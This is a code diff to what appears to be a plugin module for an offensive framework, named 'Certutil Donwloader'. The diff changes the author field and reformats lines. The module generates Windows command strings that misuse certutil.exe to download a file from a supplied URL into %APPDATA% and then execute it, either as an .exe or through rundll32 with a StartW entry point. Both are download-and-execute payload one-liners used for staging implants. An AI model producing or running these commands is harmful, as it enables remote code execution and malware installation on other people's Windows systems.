@@ -4,7 +4,7 @@ class Shell:
     def __init__(self):
         self.info = {
             'Name': 'Certutil Donwloader',
-            'Author': 'whois',
+            'Author': 'nul1',
             'Update': '2018/9/15',
         }
 
@@ -21,10 +21,12 @@ class Shell:
 """
 
     def reverse(self, url, ran):
-        return "certutil.exe -urlcache -split -f {url} %APPDATA%\\{ran}.exe&%APPDATA%\\{ran}.exe&certutil.exe -urlcache -split -f {url} delete".format(ran=ran, url=url)
+        return "certutil.exe -urlcache -split -f {url} %APPDATA%\\{ran}.exe&%APPDATA%\\{ran}.exe&certutil.exe -urlcache -split -f {url} delete".format(
+            ran=ran, url=url)
 
     def reverse2(self, url, ran):
-        return "certutil.exe -urlcache -split -f {url} %APPDATA%\\{ran}.dll&&rundll32.exe %APPDATA%\\{ran}.dll,StartW".format(ran=ran, url=url)
+        return "certutil.exe -urlcache -split -f {url} %APPDATA%\\{ran}.dll&&rundll32.exe %APPDATA%\\{ran}.dll,StartW".format(
+            ran=ran, url=url)
 
     def downloader(self, url):
         return "certutil -urlcache -split -f {0}".format(url)
